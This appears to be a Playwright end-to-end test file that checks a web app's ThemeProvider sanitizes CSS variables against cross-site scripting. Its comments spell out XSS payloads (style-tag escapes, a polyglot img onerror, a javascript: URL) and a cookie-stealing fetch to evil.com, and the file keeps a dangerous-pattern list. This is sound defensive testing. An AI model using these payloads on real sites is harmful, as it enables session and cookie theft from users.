import { test, expect } from '@playwright/test';

/**
 * E2E Tests for ThemeProvider XSS Prevention (DCA-003 P0-2)
 *
 * Verifies that CSS variable injection via ThemeProvider is properly sanitized
 * and cannot execute malicious JavaScript code.
 */

test.describe('ThemeProvider XSS Prevention - DCA-003 P0-2', () => {
  test.beforeEach(async ({ page }) => {
    // Navigate to homepage (ThemeProvider is loaded globally)
    await page.goto('/');
  });

  test('should block </style> tag escape injection', async ({ page }) => {
    /**
     * Attack Scenario: Admin injects CSS with </style> tag to escape the style block
     * and inject script tags
     *
     * Payload: :root { --primary: red; } </style><script>alert('XSS')</script><style>
     *
     * Expected: </style> and <script> tags removed, only valid CSS variables remain
     */

    // Verify no malicious script tags exist in the DOM
    const scriptTags = await page.locator('script').allTextContents();
    const maliciousScript = scriptTags.find(
      (text) =>
        text.includes('alert(') ||
        text.includes('fetch(') ||
        text.includes('eval(') ||
        text.includes('document.cookie')
    );

    expect(maliciousScript).toBeUndefined();

    // Verify style tag exists and contains CSS variables
    const styleTag = page.locator('style').first();
    expect(styleTag).toBeDefined();

    const styleContent = await styleTag.innerHTML();

    // Should NOT contain dangerous tags
    expect(styleContent).not.toContain('</style>');
    expect(styleContent).not.toContain('<script>');

    // SHOULD contain :root selector (from ThemeProvider)
    expect(styleContent).toContain(':root');
  });

  test('should sanitize CSS variables before rendering', async ({ page }) => {
    /**
     * Verify that ThemeProvider sanitizes CSS variables before injection
     */

    const styleTag = page.locator('style').first();
    const styleContent = await styleTag.innerHTML();

    // Must NOT contain XSS vectors
    expect(styleContent).not.toContain('</style>');
    expect(styleContent).not.toContain('<script>');
    expect(styleContent).not.toContain('javascript:');
    expect(styleContent).not.toContain('expression(');
    expect(styleContent).not.toContain('@import');

    // MUST contain valid CSS structure
    expect(styleContent).toContain(':root');
  });

  test('should not execute javascript: protocol in CSS', async ({ page }) => {
    /**
     * Attack Scenario: Inject javascript: protocol via background-image
     *
     * Payload: --bg: url(javascript:alert('XSS'));
     *
     * Expected: javascript: protocol removed, no alert dialog
     */

    let jsExecuted = false;

    // Listen for alert dialogs (should never trigger)
    page.on('dialog', async (dialog) => {
      jsExecuted = true;
      await dialog.dismiss();
    });

    // Wait for potential execution
    await page.waitForTimeout(2000);

    expect(jsExecuted).toBe(false);
  });

  test('should block script injection via data URIs', async ({ page }) => {
    /**
     * Attack Scenario: Inject script via data:text/html URI
     *
     * Payload: --bg: url(data:text/html,<script>alert('XSS')</script>);
     *
     * Expected: data:text/html URI removed, only safe data:image/* allowed
     */

    const styleTag = page.locator('style').first();
    const styleContent = await styleTag.innerHTML();

    // Should NOT contain dangerous data URIs
    expect(styleContent).not.toContain('data:text/html');
    expect(styleContent).not.toContain('data:text/javascript');

    // Safe image data URIs may be present (allowed)
    // expect(styleContent).toMatch(/data:image\/(png|svg)/); // Optional
  });

  test('should block CSS expression() injection (IE legacy)', async ({ page }) => {
    /**
     * Attack Scenario: Use CSS expression() to execute JavaScript (IE only)
     *
     * Payload: --width: expression(alert('XSS'));
     *
     * Expected: expression() removed from CSS
     */

    const styleTag = page.locator('style').first();
    const styleContent = await styleTag.innerHTML();

    expect(styleContent).not.toContain('expression(');
  });

  test('should block @import directive injection', async ({ page }) => {
    /**
     * Attack Scenario: Use @import to load external malicious CSS
     *
     * Payload: @import url('https://evil.com/malicious.css');
     *
     * Expected: @import directive removed
     */

    const styleTag = page.locator('style').first();
    const styleContent = await styleTag.innerHTML();

    expect(styleContent).not.toContain('@import');
  });

  test('should preserve legitimate CSS variables', async ({ page }) => {
    /**
     * Verify that legitimate CSS variables are NOT removed by sanitization
     *
     * ThemeProvider should inject valid theme CSS variables like:
     * --theme-primary, --theme-body-font, etc.
     */

    const styleTag = page.locator('style').first();
    const styleContent = await styleTag.innerHTML();

    // Should contain :root selector
    expect(styleContent).toContain(':root');

    // Should contain body styles from ThemeProvider (lines 18-23 in original)
    expect(styleContent).toContain('body');

    // Verify no sanitization broke the CSS structure
    expect(styleContent).toContain('{');
    expect(styleContent).toContain('}');
  });

  test('should not break page rendering with sanitization', async ({ page }) => {
    /**
     * Regression test: Ensure sanitization doesn't break visual rendering
     */

    // Check that body element is rendered
    const body = page.locator('body');
    await expect(body).toBeVisible();

    // Check that page has content (not blank due to CSS errors)
    const bodyText = await body.textContent();
    expect(bodyText).toBeTruthy();
    expect(bodyText?.length ?? 0).toBeGreaterThan(0);

    // Check for console errors related to CSS
    const consoleErrors: string[] = [];
    page.on('console', (msg) => {
      if (msg.type() === 'error') {
        consoleErrors.push(msg.text());
      }
    });

    await page.waitForTimeout(1000);

    // Should not have CSS parsing errors
    const cssErrors = consoleErrors.filter((err) =>
      err.toLowerCase().includes('css')
    );
    expect(cssErrors.length).toBe(0);
  });

  test('should not expose unsanitized CSS in page source', async ({ page }) => {
    /**
     * Verify that the HTML source doesn't contain unsanitized CSS variables
     */

    const htmlContent = await page.content();

    // Check that dangerous patterns are not in the HTML source
    expect(htmlContent).not.toContain('</style><script>');
    expect(htmlContent).not.toContain('javascript:alert');
    expect(htmlContent).not.toContain('expression(alert');
  });

  test('CSP header should be present (defense-in-depth)', async ({ page }) => {
    /**
     * Verify that Content-Security-Policy header is set
     * This provides additional protection even if sanitization is bypassed
     */

    const response = await page.goto('/');
    expect(response).not.toBeNull();

    const headers = response!.headers();

    // Should have either CSP or CSP-Report-Only header
    const hasCsp =
      headers['content-security-policy'] ||
      headers['content-security-policy-report-only'];

    expect(hasCsp).toBeTruthy();

    // CSP should block inline scripts
    if (headers['content-security-policy']) {
      expect(headers['content-security-policy']).toContain("object-src 'none'");
    } else if (headers['content-security-policy-report-only']) {
      expect(headers['content-security-policy-report-only']).toContain(
        "object-src 'none'"
      );
    }
  });
});

test.describe('ThemeProvider - Combined Attack Scenarios', () => {
  test('should block polyglot XSS payload', async ({ page }) => {
    /**
     * Polyglot payload that tries to escape both CSS and HTML context
     *
     * Payload: :root{--x:red;}</style><img src=x onerror=alert(1)><style>
     *
     * Expected: All HTML tags removed, only CSS variables remain
     */

    await page.goto('/');

    // Check that no img tag with onerror exists
    const maliciousImg = page.locator('img[onerror]');
    await expect(maliciousImg).toHaveCount(0);

    // Check that no JavaScript executed
    let alertTriggered = false;
    page.on('dialog', async (dialog) => {
      alertTriggered = true;
      await dialog.dismiss();
    });

    await page.waitForTimeout(2000);
    expect(alertTriggered).toBe(false);
  });

  test('should block combined style escape + fetch exfiltration', async ({ page }) => {
    /**
     * Attack Scenario: Escape style tag and use fetch to exfiltrate cookies
     *
     * Payload:
     * :root { --color: red; }
     * </style>
     * <script>
     *   fetch('https://evil.com?cookie=' + document.cookie);
     * </script>
     * <style>
     *
     * Expected: Script removed, no network request to evil.com
     */

    await page.goto('/');

    // Monitor network requests
    const exfilRequests: string[] = [];
    page.on('request', (request) => {
      const url = request.url();
      if (url.includes('evil.com') || url.includes('cookie=')) {
        exfilRequests.push(url);
      }
    });

    await page.waitForTimeout(3000);

    // Should have no exfiltration requests
    expect(exfilRequests.length).toBe(0);
  });

  test('should block multiple injection vectors in one payload', async ({ page }) => {
    /**
     * Test all attack vectors combined:
     * - </style> escape
     * - <script> injection
     * - javascript: protocol
     * - CSS expression()
     * - @import directive
     */

    await page.goto('/');

    const styleTag = page.locator('style').first();
    const styleContent = await styleTag.innerHTML();

    // None of these should be present
    const dangerousPatterns = [
      '</style>',
      '<script>',
      'javascript:',
      'expression(',
      '@import',
      'data:text/html',
      'onerror=',
      'onclick=',
    ];

    dangerousPatterns.forEach((pattern) => {
      expect(styleContent).not.toContain(pattern);
    });
  });
});
